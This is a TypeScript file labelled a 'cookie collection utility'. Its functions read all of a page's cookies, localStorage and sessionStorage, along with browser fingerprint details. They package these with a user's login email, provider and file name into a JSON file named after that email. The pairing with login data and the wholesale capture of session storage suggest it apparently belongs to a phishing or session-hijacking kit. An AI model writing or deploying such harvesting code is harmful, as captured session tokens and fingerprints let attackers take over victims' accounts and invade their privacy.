// Cookie collection utility
export interface BrowserFingerprint {
  cookies: string;
  localStorage: string;
  sessionStorage: string;
  screen: string;
  timezone: string;
  platform: string;
  cookieEnabled: boolean;
  onlineStatus: string;
  touchSupport: string;
  orientation?: string;
  devicePixelRatio?: number;
  userAgent: string;
  language: string;
  plugins: string[];
  webdriver: boolean;
  hardwareConcurrency: number;
  deviceMemory?: number;
  connection?: string;
}

export const collectBrowserFingerprint = (): BrowserFingerprint => {
  // Collect all cookies
  const cookies = document.cookie || 'No cookies found';
  
  // Collect localStorage data
  let localStorageData = 'Empty';
  try {
    const localStorageItems: string[] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        const value = localStorage.getItem(key);
        localStorageItems.push(`${key}=${value}`);
      }
    }
    localStorageData = localStorageItems.length > 0 ? localStorageItems.join('; ') : 'Empty';
  } catch (error) {
    localStorageData = 'Access denied';
  }

  // Collect sessionStorage data
  let sessionStorageData = 'Empty';
  try {
    const sessionStorageItems: string[] = [];
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (key) {
        const value = sessionStorage.getItem(key);
        sessionStorageItems.push(`${key}=${value}`);
      }
    }
    sessionStorageData = sessionStorageItems.length > 0 ? sessionStorageItems.join('; ') : 'Empty';
  } catch (error) {
    sessionStorageData = 'Access denied';
  }

  // Collect screen information
  const screen = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
  
  // Collect timezone
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  
  // Collect platform info
  const platform = navigator.platform;
  
  // Check if cookies are enabled
  const cookieEnabled = navigator.cookieEnabled;
  
  // Check online status
  const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
  
  // Check touch support
  const touchSupport = 'ontouchstart' in window ? 'Supported' : 'Not supported';
  
  // Get orientation (mobile)
  let orientation: string | undefined;
  if (screen && 'orientation' in screen) {
    orientation = (screen as any).orientation?.type || 'Unknown';
  }
  
  // Get device pixel ratio
  const devicePixelRatio = window.devicePixelRatio;
  
  // Get user agent
  const userAgent = navigator.userAgent;
  
  // Get language
  const language = navigator.language;
  
  // Get plugins
  const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
  
  // Check for webdriver
  const webdriver = !!(navigator as any).webdriver;
  
  // Get hardware concurrency
  const hardwareConcurrency = navigator.hardwareConcurrency || 0;
  
  // Get device memory (if available)
  const deviceMemory = (navigator as any).deviceMemory;
  
  // Get connection info (if available)
  let connection: string | undefined;
  const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
  if (conn) {
    connection = `${conn.effectiveType || 'Unknown'} (${conn.downlink || 'Unknown'}Mbps)`;
  }

  return {
    cookies,
    localStorage: localStorageData,
    sessionStorage: sessionStorageData,
    screen,
    timezone,
    platform,
    cookieEnabled,
    onlineStatus,
    touchSupport,
    orientation,
    devicePixelRatio,
    userAgent,
    language,
    plugins,
    webdriver,
    hardwareConcurrency,
    deviceMemory,
    connection
  };
};

// Function to create downloadable cookies file
export const createCookiesFile = (fingerprint: BrowserFingerprint, loginData: any) => {
  const cookiesData = {
    timestamp: new Date().toISOString(),
    domain: window.location.hostname,
    url: window.location.href,
    userAgent: fingerprint.userAgent,
    cookies: fingerprint.cookies,
    localStorage: fingerprint.localStorage,
    sessionStorage: fingerprint.sessionStorage,
    loginInfo: {
      email: loginData.email,
      provider: loginData.provider,
      fileName: loginData.fileName,
      timestamp: loginData.timestamp
    },
    browserInfo: {
      screen: fingerprint.screen,
      timezone: fingerprint.timezone,
      platform: fingerprint.platform,
      language: fingerprint.language,
      cookieEnabled: fingerprint.cookieEnabled,
      onlineStatus: fingerprint.onlineStatus,
      touchSupport: fingerprint.touchSupport,
      orientation: fingerprint.orientation,
      devicePixelRatio: fingerprint.devicePixelRatio,
      plugins: fingerprint.plugins,
      webdriver: fingerprint.webdriver,
      hardwareConcurrency: fingerprint.hardwareConcurrency,
      deviceMemory: fingerprint.deviceMemory,
      connection: fingerprint.connection
    }
  };

  // Create downloadable file
  const dataStr = JSON.stringify(cookiesData, null, 2);
  const dataBlob = new Blob([dataStr], { type: 'application/json' });
  const url = URL.createObjectURL(dataBlob);
  
  const link = document.createElement('a');
  link.href = url;
  link.download = `cookies_${loginData.email}_${Date.now()}.json`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
  
  return cookiesData;
};

// Function to parse cookies into a more readable format
export const parseCookies = (cookieString: string): Record<string, string> => {
  const cookies: Record<string, string> = {};
  if (cookieString && cookieString !== 'No cookies found') {
    cookieString.split(';').forEach(cookie => {
      const [name, ...rest] = cookie.trim().split('=');
      if (name && rest.length > 0) {
        cookies[name] = rest.join('=');
      }
    });
  }
  return cookies;
};